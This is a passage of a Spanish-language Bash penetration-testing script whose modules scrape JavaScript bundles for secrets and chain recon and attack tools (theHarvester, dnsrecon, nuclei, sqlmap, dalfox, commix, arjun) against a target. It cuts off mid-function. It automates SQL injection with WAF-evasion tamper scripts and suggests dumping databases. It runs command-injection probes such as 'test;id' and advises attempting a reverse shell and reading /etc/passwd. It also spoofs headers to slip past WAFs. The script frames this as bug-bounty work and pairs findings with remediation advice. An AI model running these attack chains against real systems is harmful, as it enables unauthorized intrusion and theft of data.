        local sw_url="${base_url}${ep}"
        local sw_status
        sw_status=$(curl -sko /dev/null --max-time 5 -w "%{http_code}" "${sw_url}" 2>/dev/null)
        if [[ "$sw_status" == "200" ]]; then
            ok "Swagger/OpenAPI encontrado: ${sw_url}"
            INTEL_SWAGGER_URL="${sw_url}"
            intel_log "Swagger expuesto → parseando endpoints para SQLi/XSS"
            add_finding "ALTO" "Swagger/API Docs Expuestos Públicamente" \
                "URL: <b>${sw_url}</b><br>Los API docs expuestos revelan todos los endpoints.<br><b>Extraer endpoints:</b> <code>curl -s ${sw_url} | jq -r \'.paths | keys[]\' 2>/dev/null</code>"
        fi
    done
    echo
}

# ─── MÓDULO 16: JS/JSX ANALYSIS ─────────────────────────────────
modulo_js_analysis() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && warn "Sin puertos web. Saltando análisis JS." && return

    log "MÓDULO 16: JavaScript / JSX Analysis"
    tip "Las apps modernas (React, Vue, Angular) esconden endpoints, tokens y secrets en sus JS bundles."

    local proto="http"
    local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local js_dir="${OUTPUT_DIR}/web/js_analysis"
    mkdir -p "$js_dir"

    local vuln_count=0
    local findings_detail=""

    echo -e "  Base URL: ${C_CYN}${base_url}${C_RST}"
    echo

    # ── PASO 1: Descubrir archivos JS en la página ──
    log "Paso 1/4: Descubriendo archivos JS..."
    local page_html
    page_html=$(curl -skL --max-time 15 \
        -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
        "${base_url}" 2>/dev/null)

    # Extraer todos los src de scripts
    local js_files
    js_files=$(echo "$page_html" | \
        grep -oE '(src|href)="[^"]*\.js[^"]*"' | \
        grep -oE '"[^"]*"' | tr -d '"' | \
        grep -v "^#" | sort -u)

    # También buscar archivos .js en sourcemaps y webpack
    local sourcemaps
    sourcemaps=$(echo "$page_html" | grep -oE '//# sourceMappingURL=[^\s]+')

    # Rutas comunes de bundles modernos
    local COMMON_JS_PATHS=(
        "/static/js/main.js"
        "/static/js/bundle.js"
        "/static/js/app.js"
        "/assets/index.js"
        "/assets/app.js"
        "/dist/bundle.js"
        "/dist/app.js"
        "/js/app.js"
        "/js/main.js"
        "/build/static/js/main.chunk.js"
        "/chunk.js"
        "/runtime-main.js"
        "/vendor.js"
        "/app.bundle.js"
        "/wp-includes/js/jquery/jquery.min.js"
    )

    local all_js_urls=()
    while IFS= read -r js; do
        [[ -z "$js" ]] && continue
        if [[ "$js" == http* ]]; then
            all_js_urls+=("$js")
        else
            all_js_urls+=("${base_url}/${js#/}")
        fi
    done <<< "$js_files"

    # Probar rutas comunes
    for path in "${COMMON_JS_PATHS[@]}"; do
        local status
        status=$(curl -sko /dev/null --max-time 5 -w "%{http_code}" "${base_url}${path}" 2>/dev/null)
        [[ "$status" == "200" ]] && all_js_urls+=("${base_url}${path}")
    done

    local js_count="${#all_js_urls[@]}"
    ok "Archivos JS encontrados: ${js_count}"

    if (( js_count == 0 )); then
        warn "No se encontraron archivos JS. El site puede usar SSR o no cargar JS externo."
        add_finding "INFO" "JS Analysis" "No se encontraron archivos JavaScript externos accesibles."
        return
    fi

    # ── PASO 2: Descargar y analizar cada JS ──
    log "Paso 2/4: Descargando y analizando archivos JS..."

    # Patrones paralelos: nombres y regex
    local PAT_NAMES=(
        "API Key"
        "Token JWT"
        "AWS Access Key"
        "AWS Secret Key"
        "Google API Key"
        "Firebase URL"
        "Stripe Key"
        "Private Key PEM"
        "Password hardcoded"
        "Token hardcoded"
        "Endpoint interno"
        "MongoDB URI"
        "SQL Connection"
        "Email hardcoded"
        "IP interna"
        "Endpoint API"
        "Ruta sensible"
    )
    local PAT_REGEX=(
        'api[_-]?key[[:space:]]*[:=][[:space:]]*[[:alnum:]_-]{16,}'
        'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
        'AKIA[0-9A-Z]{16}'
        'aws[_-]?secret[_-]?access[_-]?key'
        'AIza[0-9A-Za-z_-]{35}'
        'https://[a-z0-9-]+\.firebaseio\.com'
        'sk_live_[0-9a-zA-Z]{24,}'
        'BEGIN PRIVATE KEY'
        'password[[:space:]]*:[[:space:]]*[^[:space:]]{6,}'
        'auth_token[[:space:]]*=[[:space:]]*[a-zA-Z0-9_-]{20,}'
        'https?://(internal|localhost|127\.0\.0\.1|192\.168\.[0-9]+\.[0-9]+|10\.[0-9]+\.[0-9]+\.[0-9]+)'
        'mongodb://[^[:space:]<>]+'
        'mysql://[^[:space:]<>]+'
        '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        '192\.168\.[0-9]+\.[0-9]+'
        '/api/v[0-9]/[a-zA-Z0-9/_-]+'
        '/(admin|dashboard|config|debug|secret|private|backup)/'
    )

    local secrets_report=""
    local endpoints_report=""
    local analyzed=0

    for js_url in "${all_js_urls[@]}"; do
        [[ -z "$js_url" ]] && continue
        local js_file_name
        js_file_name=$(echo "$js_url" | sed 's|[/:?=&]|_|g' | tail -c 60)
        local local_js="${js_dir}/${js_file_name}"

        echo -e "  ${C_DIM}Analizando:${C_RST} ${C_CYN}${js_url}${C_RST}"

        curl -skL --max-time 15 \
            -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
            "${js_url}" -o "${local_js}" 2>/dev/null

        [[ ! -s "$local_js" ]] && continue
        ((analyzed++)) || true

        local file_size
        file_size=$(du -sh "$local_js" 2>/dev/null | cut -f1)
        echo -e "    ${C_DIM}Tamaño: ${file_size}${C_RST}"

        # Buscar cada patrón (usando arrays paralelos)
        local pat_idx=0
        while [[ $pat_idx -lt ${#PAT_NAMES[@]} ]]; do
            local pattern_name="${PAT_NAMES[$pat_idx]}"
            local pattern="${PAT_REGEX[$pat_idx]}"
            local matches
            matches=$(grep -oiE "$pattern" "$local_js" 2>/dev/null | head -5 | tr '\n' ' ')

            if [[ -n "$matches" ]]; then
                echo -e "    ${C_RED}[!] ${pattern_name}:${C_RST} ${matches:0:100}..."
                ((vuln_count++)) || true

                local severity="ALTO"
                [[ "$pattern_name" == *"AWS"* || "$pattern_name" == *"Private Key"* || "$pattern_name" == *"JWT"* ]] && severity="CRITICO"
                [[ "$pattern_name" == *"Email"* || "$pattern_name" == *"Endpoint API"* ]] && severity="BAJO"
                [[ "$pattern_name" == *"IP interna"* || "$pattern_name" == *"Endpoint interno"* ]] && severity="MEDIO"

                secrets_report+="<tr><td>${severity}</td><td>${js_url}</td><td>${pattern_name}</td><td><code>${matches:0:150}</code></td></tr>"
            fi
            ((pat_idx++)) || true
        done

        # ── Extraer endpoints de la API del JS ──
        local api_endpoints
        api_endpoints=$(grep -oE "/[a-zA-Z0-9/_-]{3,80}" "$local_js" 2>/dev/null | \
            grep -v "^//" | \
            sort -u | head -50)

        if [[ -n "$api_endpoints" ]]; then
            endpoints_report+="<b>${js_url}</b><pre>${api_endpoints}</pre>"
        fi

        # Guardar versión legible (si es minificado, formatear básico)
        # Guardar copia legible básica (sed beautify)
        sed 's/;/;\n/g; s/{/{\n/g; s/}/\n}\n/g' "${local_js}" 2>/dev/null | head -c 500000 > "${local_js}.readable" 2>/dev/null || true
    done

    # ── PASO 3: Source Maps ──
    echo
    log "Paso 3/4: Buscando Source Maps (.map)..."
    local sourcemap_count=0
    for js_url in "${all_js_urls[@]}"; do
        local map_url="${js_url}.map"
        local map_status
        map_status=$(curl -sko /dev/null --max-time 5 -w "%{http_code}" "${map_url}" 2>/dev/null)
        if [[ "$map_status" == "200" ]]; then
            warn "Source Map EXPUESTO: ${map_url}"
            ((sourcemap_count++)) || true
            add_finding "ALTO" "Source Map Expuesto Públicamente" \
                "URL: <b>${map_url}</b><br>Los source maps revelan el código fuente original (incluso TypeScript/JSX sin compilar).<br><b>Herramienta:</b> <code>sourcemapper -url ${map_url} -output ./sourcecode</code>"
        fi
    done
    [[ $sourcemap_count -eq 0 ]] && ok "No se encontraron source maps expuestos."

    # ── PASO 4: Detectar frameworks JS ──
    echo
    log "Paso 4/4: Detectando framework JS..."
    local framework="Desconocido"
    local fw_detail=""

    if [[ -n "$page_html" ]]; then
        echo "$page_html" | grep -qi "react\|__REACT\|data-reactroot\|_react" && framework="React" && fw_detail="React detectado — busca /static/js/ para bundles"
        echo "$page_html" | grep -qi "ng-version\|angular\|__ngContext__" && framework="Angular" && fw_detail="Angular detectado — revisa main.js y environment.ts en source maps"
        echo "$page_html" | grep -qi "__vue\|v-app\|nuxt" && framework="Vue/Nuxt" && fw_detail="Vue detectado — busca api/ en Vuex store"
        echo "$page_html" | grep -qi "next/\|__NEXT_DATA__\|_next/static" && framework="Next.js" && fw_detail="Next.js detectado — revisa /_next/static/chunks/ y /api/ routes"
        echo "$page_html" | grep -qi "gatsby\|___gatsby" && framework="Gatsby" && fw_detail="Gatsby detectado — busca /page-data/app-data.json"
        echo "$page_html" | grep -qi "svelte\|__svelte" && framework="Svelte" && fw_detail="Svelte detectado"
        echo "$page_html" | grep -qi "ember\|Ember\." && framework="Ember.js" && fw_detail="Ember.js detectado"
        echo "$page_html" | grep -qi "window\.wp\|wp-content\|wp-includes" && framework="WordPress+React" && fw_detail="WordPress con Gutenberg/React detectado — revisa wp-json API"
    fi

    if [[ "$framework" != "Desconocido" ]]; then
        ok "Framework detectado: ${C_YEL}${framework}${C_RST}"
        add_finding "INFO" "Framework JS Detectado: ${framework}" "${fw_detail}"
    fi

    # ── Reporte final ──
    echo
    ok "Archivos JS analizados: ${analyzed}"

    if (( vuln_count > 0 )); then
        add_finding "CRÍTICO" "Secretos/Datos Sensibles en JavaScript (${vuln_count} hallazgos)" \
            "<table class='vuln-table'><tr><th>Severidad</th><th>Archivo JS</th><th>Tipo</th><th>Valor (truncado)</th></tr>${secrets_report}</table>"
    else
        ok "No se encontraron secretos obvios en los archivos JS analizados."
        add_finding "INFO" "JS Analysis" "No se encontraron secrets/tokens hardcoded obvios en ${analyzed} archivos JS analizados."
    fi

    if [[ -n "$endpoints_report" ]]; then
        add_finding "MEDIO" "Endpoints Extraídos de Archivos JS" \
            "${endpoints_report}<br><b>Tip:</b> Prueba estos endpoints directamente con curl o Burp Suite."

        # ── INTEL WRITE: registrar endpoints para SQLi/XSS ──
        local js_dir_local="${OUTPUT_DIR}/web/js_analysis"
        while IFS= read -r ep; do
            [[ "$ep" == /api/* || "$ep" == /v[0-9]/* ]] && INTEL_API_ENDPOINTS+=("${base_url}${ep}")
        done < <(find "${js_dir_local}" -name "*.txt" -exec grep -ohE "/[a-zA-Z0-9/_-]{3,60}" {} \; 2>/dev/null | sort -u | head -30)

        intel_log "Endpoints de JS registrados para pruebas: ${#INTEL_API_ENDPOINTS[@]}"
    fi

    ok "Archivos JS descargados en: ${js_dir}/"
    echo
}


# ════════════════════════════════════════════════════════════════
# MÓDULOS v3.0 — NUEVAS HERRAMIENTAS
# ════════════════════════════════════════════════════════════════

# ─── MÓDULO 17: THEHARVESTER — OSINT PASIVO ──────────────────────
modulo_theharvester() {
    is_domain "$TARGET" || { warn "theHarvester requiere dominio, no IP."; return; }
    command -v theHarvester >/dev/null 2>&1 || { warn "theHarvester no disponible: sudo apt install theharvester"; return; }

    log "MÓDULO 17: theHarvester — OSINT Pasivo"
    tip "Recolecta emails, IPs y subdominios sin tocar el target. Safe para Bug Bounty."

    local out_txt="${OUTPUT_DIR}/recon/theharvester.txt"
    cmd_show "theHarvester -d ${TARGET} -b google,bing,crtsh,dnsdumpster,urlscan"

    theHarvester -d "${TARGET}" -b google,bing,crtsh,dnsdumpster,urlscan \
        -f "${OUTPUT_DIR}/recon/theharvester" 2>/dev/null | tee "${out_txt}"

    local emails ips hosts
    emails=$(grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "${out_txt}" 2>/dev/null | sort -u)
    ips=$(grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' "${out_txt}" 2>/dev/null | sort -u | head -30)
    hosts=$(grep -oE "[a-zA-Z0-9._-]+\.${TARGET}" "${out_txt}" 2>/dev/null | sort -u | head -30)

    local email_count=0; local host_count=0
    [[ -n "$emails" ]] && email_count=$(echo "$emails" | wc -l)
    [[ -n "$hosts"  ]] && host_count=$(echo "$hosts"   | wc -l)

    ok "Emails: ${email_count} | Hosts: ${host_count}"

    [[ -n "$emails" ]] && add_finding "MEDIO" \
        "Emails Corporativos Expuestos (${email_count})" \
        "<pre>${emails}</pre>" \
        "4.3" \
        "Evaluar política de exposición de emails. Usar alias en lugar de emails reales en páginas públicas." \
        "Verificar emails en HaveIBeenPwned. Usar para enumeración de usuarios o phishing simulado."

    if [[ -n "$hosts" ]]; then
        add_finding "INFO" "Subdominios via OSINT (${host_count})" "<pre>${hosts}</pre>" \
            "N/A" "Inventariar todos los subdominios activos. Dar de baja los no utilizados." \
            "Verificar cada subdominio con httpx/nmap. Buscar subdomain takeover."
        while IFS= read -r h; do
            [[ -n "$h" ]] && INTEL_SUBDOMAINS+=("$h")
        done <<< "$hosts"
        intel_log "OSINT: ${host_count} subdominios nuevos registrados"
    fi

    [[ -n "$ips" ]] && add_finding "INFO" "IPs Asociadas (OSINT)" "<pre>${ips}</pre>" \
        "N/A" "Verificar que solo IPs autorizadas resuelvan al dominio." \
        "Revisar IPs en Shodan/Censys para servicios no documentados."
    echo
}

# ─── MÓDULO 18: DNSRECON — DNS COMPLETO ──────────────────────────
modulo_dnsrecon() {
    is_domain "$TARGET" || { warn "dnsrecon requiere dominio."; return; }
    command -v dnsrecon >/dev/null 2>&1 || { warn "dnsrecon no disponible: sudo apt install dnsrecon"; return; }

    log "MÓDULO 18: dnsrecon — DNS Completo (Zone Transfer, SPF, DMARC)"
    tip "Zone transfer puede revelar TODA la infraestructura interna del dominio."

    local out_file="${OUTPUT_DIR}/recon/dnsrecon.txt"
    cmd_show "dnsrecon -d ${TARGET} -t std,axfr,brt"

    dnsrecon -d "${TARGET}" -t std,axfr,brt 2>/dev/null | tee "${out_file}"

    if grep -qi "zone transfer\|axfr" "${out_file}" 2>/dev/null && \
       grep -qi "success\|records\|A " "${out_file}" 2>/dev/null; then
        add_finding "CRÍTICO" "DNS Zone Transfer Permitido" \
            "El servidor DNS permite AXFR. Toda la infraestructura DNS interna queda expuesta." \
            "10.0" \
            "Deshabilitar zone transfer público. Permitir solo entre nameservers autorizados via ACL." \
            "Extraer registros: dig axfr ${TARGET} @\$(dig NS ${TARGET} +short | head -1)"
        intel_log "CRÍTICO: Zone Transfer habilitado"
    fi

    local spf; spf=$(grep -iE "spf|v=spf" "${out_file}" 2>/dev/null | head -3)
    local dmarc; dmarc=$(grep -i "_dmarc\|dmarc" "${out_file}" 2>/dev/null | head -2)

    [[ -z "$spf" ]] && add_finding "MEDIO" "SPF No Configurado — Email Spoofing Posible" \
        "Sin SPF cualquiera puede enviar emails falsos desde @${TARGET}." \
        "5.4" \
        "Agregar TXT record: v=spf1 include:_spf.tu-proveedor.com ~all" \
        "Probar con: sendEmail o verificar en mxtoolbox.com/spf"

    [[ -z "$dmarc" ]] && add_finding "MEDIO" "DMARC No Configurado" \
        "Sin DMARC los emails falsificados no son bloqueados automáticamente." \
        "5.4" \
        "Agregar: _dmarc.${TARGET} TXT \"v=DMARC1; p=quarantine; rua=mailto:dmarc@${TARGET}\"" \
        "Validar en: https://dmarcian.com/dmarc-inspector/"

    local mx_records; mx_records=$(grep -iE "^MX|mail exchanger" "${out_file}" 2>/dev/null | head -5)
    [[ -n "$mx_records" ]] && add_finding "INFO" "Servidores de Correo (MX)" "<pre>${mx_records}</pre>" \
        "N/A" "Verificar que MX no exponga servidores internos." \
        "Enumerar usuarios: smtp-user-enum -M VRFY -U users.txt -t \$(dig MX ${TARGET} +short | head -1 | awk '{print \$2}')"

    ok "dnsrecon completado: ${out_file}"
    echo
}

# ─── MÓDULO 19: SSLSCAN — ANÁLISIS TLS/SSL ───────────────────────
modulo_sslscan() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    local has_tls=false
    for p in "${WEB_PORTS[@]}"; do [[ "$p" == "443" || "$p" == "8443" ]] && has_tls=true; done
    [[ "$ORIGINAL_URL" =~ ^https:// ]] && has_tls=true
    [[ "$has_tls" == "false" ]] && { warn "Sin TLS detectado. Saltando sslscan."; return; }

    command -v sslscan >/dev/null 2>&1 || { warn "sslscan no disponible: sudo apt install sslscan"; return; }

    log "MÓDULO 19: SSLScan — Análisis TLS/SSL"
    tip "TLS 1.0/1.1 y ciphers débiles son hallazgos Medium-High en Bug Bounty."

    local out_file="${OUTPUT_DIR}/web/sslscan.txt"
    cmd_show "sslscan --no-colour ${TARGET}"
    sslscan --no-colour "${TARGET}" 2>/dev/null | tee "${out_file}"
    [[ ! -s "$out_file" ]] && { warn "sslscan sin output."; return; }

    if grep -qi "TLSv1\.0\|SSLv3\|SSLv2" "${out_file}" 2>/dev/null; then
        local old_tls; old_tls=$(grep -iE "TLSv1\.0|SSLv3|SSLv2" "${out_file}" | grep -iv "disabled\|not offered" | head -5)
        [[ -n "$old_tls" ]] && add_finding "ALTO" "Protocolo TLS Obsoleto Habilitado" \
            "<pre>${old_tls}</pre>" "7.5" \
            "Deshabilitar TLS 1.0 y 1.1. Solo permitir TLS 1.2 y TLS 1.3." \
            "Apache: SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1 | Nginx: ssl_protocols TLSv1.2 TLSv1.3;"
    fi

    if grep -qi "RC4\|3DES\|EXPORT\|NULL cipher" "${out_file}" 2>/dev/null; then
        local weak; weak=$(grep -iE "RC4|3DES|EXPORT|NULL cipher" "${out_file}" | grep -iv "disabled" | head -10)
        [[ -n "$weak" ]] && add_finding "ALTO" "Cipher Suites Débiles" \
            "<pre>${weak}</pre>" "7.5" \
            "Usar solo ciphers modernos: TLS_AES_256_GCM_SHA384, ECDHE-RSA-AES256-GCM-SHA384" \
            "Validar grado A en: https://www.ssllabs.com/ssltest/"
    fi

    grep -qi "heartbleed.*vulnerable\|heartbleed.*yes" "${out_file}" 2>/dev/null && \
        add_finding "CRÍTICO" "Heartbleed (CVE-2014-0160)" \
        "Servidor vulnerable a Heartbleed. Expone memoria con claves, contraseñas y sesiones." \
        "10.0" \
        "Actualizar OpenSSL inmediatamente. Revocar y regenerar todos los certificados SSL." \
        "Verificar: nmap -p 443 --script ssl-heartbleed ${TARGET}"

    grep -qi "expired\|self-signed" "${out_file}" 2>/dev/null && \
        add_finding "MEDIO" "Problema con Certificado TLS" \
        "$(grep -iE 'expired|self.signed' "${out_file}" | head -2)" \
        "5.3" \
        "Renovar certificado. Usar Let's Encrypt para certificados gratuitos y automáticos." \
        "openssl s_client -connect ${TARGET}:443 | openssl x509 -noout -dates"
    echo
}

# ─── MÓDULO 20: NUCLEI — CVE & MISCONFIG SCANNER ─────────────────
modulo_nuclei() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && { warn "Nuclei requiere puertos web."; return; }
    command -v nuclei >/dev/null 2>&1 || { warn "nuclei no disponible: sudo apt install nuclei && nuclei -update-templates"; return; }

    log "MÓDULO 20: Nuclei — CVE & Misconfiguration Scanner"
    tip "Nuclei es el estándar en Bug Bounty. 9000+ templates, CVEs con CVSS incluidos."

    local proto="http"; local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/nuclei_results.txt"

    local template_flags="-t exposures,misconfiguration,vulnerabilities,cves,technologies"
    [[ "$INTEL_CMS" == "wordpress" ]] && template_flags+=" -t wordpress" && intel_log "WP templates activados"
    [[ "$INTEL_WAF_DETECTED" == "true" ]] && template_flags+=" -H 'X-Forwarded-For: 127.0.0.1'"

    cmd_show "nuclei -u ${url} ${template_flags} -severity critical,high,medium -silent"

    nuclei -u "${url}" \
        ${template_flags} \
        -severity critical,high,medium,low \
        -o "${out_file}" \
        -silent \
        -timeout 10 \
        -rate-limit 50 \
        2>/dev/null

    if [[ -s "$out_file" ]]; then
        local crit high med
        crit=$(grep -c "\[critical\]" "${out_file}" 2>/dev/null || echo 0)
        high=$(grep -c "\[high\]"     "${out_file}" 2>/dev/null || echo 0)
        med=$( grep -c "\[medium\]"   "${out_file}" 2>/dev/null || echo 0)

        ok "Nuclei: CRÍTICO=${crit} ALTO=${high} MEDIO=${med}"

        local n_crit; n_crit=$(grep "\[critical\]" "${out_file}" | head -20)
        local n_high; n_high=$(grep "\[high\]"     "${out_file}" | head -20)

        [[ -n "$n_crit" ]] && add_finding "CRÍTICO" "Nuclei: ${crit} Vulnerabilidades Críticas" \
            "<pre>${n_crit}</pre>" "9.5" \
            "Revisar cada CVE en https://nvd.nist.gov y aplicar el parche correspondiente de inmediato." \
            "Ver detalles: nuclei -u ${url} -id TEMPLATE-ID | Usar searchsploit para exploits"

        [[ -n "$n_high" ]] && add_finding "ALTO" "Nuclei: ${high} Vulnerabilidades Altas" \
            "<pre>${n_high}</pre>" "7.8" \
            "Planificar corrección en siguiente sprint. Revisar templates para contexto de remediación." \
            "Ver output completo: ${out_file}"

        local cves_found; cves_found=$(grep -oE 'CVE-[0-9]{4}-[0-9]+' "${out_file}" 2>/dev/null | sort -u)
        [[ -n "$cves_found" ]] && add_finding "ALTO" "CVEs Confirmados por Nuclei" \
            "<pre>${cves_found}</pre>" "8.0" \
            "Consultar cada CVE en NVD y aplicar mitigaciones indicadas." \
            "searchsploit CVE-XXXX-XXXX para buscar exploits públicos"
    else
        ok "Nuclei: sin hallazgos críticos/altos."
        add_finding "INFO" "Nuclei Scan" "Sin vulnerabilidades conocidas detectadas con templates aplicados." \
            "N/A" "Mantener nuclei actualizado: nuclei -update-templates" \
            "Re-escanear cuando se publiquen nuevos CVEs relacionados al stack."
    fi
    echo
}

# ─── MÓDULO 21: SQLMAP — CONFIRMACIÓN SQLi ───────────────────────
modulo_sqlmap() {
    [[ "$INTEL_SQLI_FOUND" != "true" ]] && {
        warn "SQLi no detectado previamente (módulo 13). Saltando sqlmap."
        return
    }
    command -v sqlmap >/dev/null 2>&1 || { warn "sqlmap no disponible: sudo apt install sqlmap"; return; }

    log "MÓDULO 21: sqlmap — Confirmación Automática SQLi"
    tip "Confirma y explota SQLi encontrado por módulo 13. Requiere permiso explícito."

    local out_dir="${OUTPUT_DIR}/exploits/sqlmap"
    mkdir -p "$out_dir"

    local sqli_url="${ORIGINAL_URL:-}"
    [[ -f "${OUTPUT_DIR}/web/sqli_results.txt" ]] && \
        sqli_url=$(grep -oE 'https?://[^ ]+' "${OUTPUT_DIR}/web/sqli_results.txt" | head -1)
    [[ -z "$sqli_url" ]] && [[ ${#INTEL_INJECTABLE_URLS[@]} -gt 0 ]] && \
        sqli_url="${INTEL_INJECTABLE_URLS[0]}"
    [[ -z "$sqli_url" ]] && { warn "No hay URL SQLi para sqlmap."; return; }

    local waf_flags="--level=2 --risk=1 --batch"
    [[ "$INTEL_WAF_DETECTED" == "true" ]] && \
        waf_flags="--tamper=between,charencode,randomcase,space2comment --level=3 --risk=2 --delay=1 --batch"

    local dbms_flag=""
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " mysql "      ]] && dbms_flag="--dbms=mysql"
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " postgresql " ]] && dbms_flag="--dbms=postgresql"

    cmd_show "sqlmap -u ${sqli_url} --dbs ${waf_flags} ${dbms_flag}"

    sqlmap -u "${sqli_url}" --dbs ${waf_flags} ${dbms_flag} \
        --output-dir="${out_dir}" --timeout=30 2>/dev/null | tee "${out_dir}/output.txt"

    if grep -qi "is vulnerable\|parameter.*is.*injectable" "${out_dir}/output.txt" 2>/dev/null; then
        local db_names; db_names=$(grep -A5 "available databases" "${out_dir}/output.txt" | grep "\[" | head -10)
        add_finding "CRÍTICO" "SQLi CONFIRMADO por sqlmap" \
            "<b>URL:</b> ${sqli_url}<br><b>BDs expuestas:</b><pre>${db_names}</pre>" \
            "9.8" \
            "1) Usar Prepared Statements. 2) Validar y sanitizar toda entrada. 3) Mínimo privilegio en BD. 4) WAF como capa adicional (no única defensa)." \
            "Extraer datos: sqlmap -u '${sqli_url}' --dump --batch ${waf_flags}. Corregir queries vulnerables en código fuente."
        intel_log "SQLi CONFIRMADO por sqlmap"
    fi
    echo
}

# ─── MÓDULO 22: DALFOX — XSS AVANZADO ───────────────────────────
modulo_dalfox() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    command -v dalfox >/dev/null 2>&1 || {
        warn "dalfox no disponible."
        echo -e "  Instalar: ${C_CYN}sudo apt install dalfox${C_RST} o ${C_CYN}go install github.com/hahwul/dalfox/v2@latest${C_RST}"
        return
    }

    log "MÓDULO 22: Dalfox — XSS Avanzado (DOM-XSS, Reflected, Header)"
    tip "Dalfox detecta XSS que curl no puede: DOM-based, contexto JS, codificaciones complejas."

    local proto="http"; local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/dalfox_results.txt"

    local waf_flags=""
    [[ "$INTEL_WAF_DETECTED" == "true" ]] && waf_flags="--waf-evasion --delay 500"

    cmd_show "dalfox url ${url} --silence --output ${out_file} ${waf_flags}"
    dalfox url "${url}" --silence --output "${out_file}" ${waf_flags} --timeout 30 2>/dev/null

    if [[ ${#INTEL_INJECTABLE_URLS[@]} -gt 0 ]]; then
        local urls_file="/tmp/dalfox_urls.txt"
        printf '%s\n' "${INTEL_INJECTABLE_URLS[@]}" > "$urls_file"
        dalfox file "$urls_file" --silence >> "${out_file}" 2>/dev/null
        intel_log "Dalfox testeó ${#INTEL_INJECTABLE_URLS[@]} URLs adicionales de gobuster/arjun"
    fi

    if [[ -s "$out_file" ]] && grep -qi "VULN\|XSS\|Injected" "${out_file}" 2>/dev/null; then
        local xss_count; xss_count=$(grep -c "VULN\|Injected" "${out_file}" 2>/dev/null || echo 1)
        local xss_detail; xss_detail=$(grep -iE "VULN|Injected|payload" "${out_file}" | head -20)
        INTEL_XSS_FOUND=true
        add_finding "CRÍTICO" "XSS Confirmado por Dalfox (${xss_count} puntos)" \
            "<pre>${xss_detail}</pre>" "8.2" \
            "1) Implementar CSP estricto. 2) Escapar output HTML: htmlspecialchars(). 3) Usar frameworks con auto-escaping. 4) Validar input en servidor." \
            "Generar PoC para Bug Bounty: dalfox url 'URL' --mining-dict | Usar Burp Collaborator para blind XSS"
    else
        ok "Dalfox: sin XSS confirmado."
        add_finding "INFO" "XSS (Dalfox)" "No se confirmó XSS con Dalfox en URLs probadas." \
            "N/A" "Revisar manualmente con Burp Suite: XSS almacenado y DOM-based son más difíciles de detectar automáticamente." \
            "Revisar CSP actual: curl -sI ${url} | grep -i content-security-policy"
    fi
    echo
}

# ─── MÓDULO 23: COMMIX — COMMAND INJECTION ───────────────────────
modulo_commix() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    command -v commix >/dev/null 2>&1 || { warn "commix no disponible: sudo apt install commix"; return; }

    log "MÓDULO 23: commix — OS Command Injection"
    tip "Command injection = RCE completo. Máximo impacto en Bug Bounty."

    local proto="http"; local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local target_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    [[ ${#INTEL_INJECTABLE_URLS[@]} -gt 0 ]] && target_url="${INTEL_INJECTABLE_URLS[0]}" && \
        intel_log "Commix usando URL de gobuster/arjun: ${target_url}"

    local out_file="${OUTPUT_DIR}/web/commix_results.txt"
    mkdir -p "${OUTPUT_DIR}/exploits/commix"
    cmd_show "commix --url=${target_url} --batch --output-dir=${OUTPUT_DIR}/exploits/commix"

    commix --url="${target_url}" --batch \
        --output-dir="${OUTPUT_DIR}/exploits/commix" \
        --timeout=20 2>/dev/null | tee "${out_file}"

    if grep -qi "vulnerable\|is injectable\|shell" "${out_file}" 2>/dev/null; then
        add_finding "CRÍTICO" "OS Command Injection (RCE) Detectado" \
            "<pre>$(head -20 "${out_file}")</pre>" "9.8" \
            "1) No pasar input al shell directamente. 2) Usar APIs nativas del lenguaje. 3) Whitelist de valores permitidos. 4) Escapar todos los caracteres especiales de shell." \
            "Intentar reverse shell. Documentar para reporte con: id, whoami, hostname, cat /etc/passwd"
        intel_log "CRÍTICO: RCE via Command Injection"
    else
        ok "commix: sin command injection detectado."
        add_finding "INFO" "Command Injection" "No se detectó OS injection en endpoints probados." \
            "N/A" "Revisar manualmente parámetros que procesen rutas, comandos o nombres de archivo." \
            "Probar: test;id | test&&whoami | test\`id\`"
    fi
    echo
}

# ─── MÓDULO 24: ARJUN — PARÁMETROS OCULTOS ──────────────────────
modulo_arjun() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    command -v arjun >/dev/null 2>&1 || {
        warn "arjun no disponible: pip3 install arjun --break-system-packages"
        return
    }

    log "MÓDULO 24: arjun — Parámetros HTTP Ocultos"
    tip "Los parámetros ocultos suelen ser: debug=true, admin=1, id=X (IDOR), redirect=URL (Open Redirect)."

    local proto="http"; local port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_json="${OUTPUT_DIR}/web/arjun_params.json"

    cmd_show "arjun -u ${url} --stable -oJ ${out_json}"
    arjun -u "${url}" --stable -oJ "${out_json}" 2>/dev/null

    if [[ -s "$out_json" ]]; then
        local params_raw
        params_raw=$(python3 -c "
import json
try:
    d=json.load(open('${out_json}'))
    for url,p in d.items():
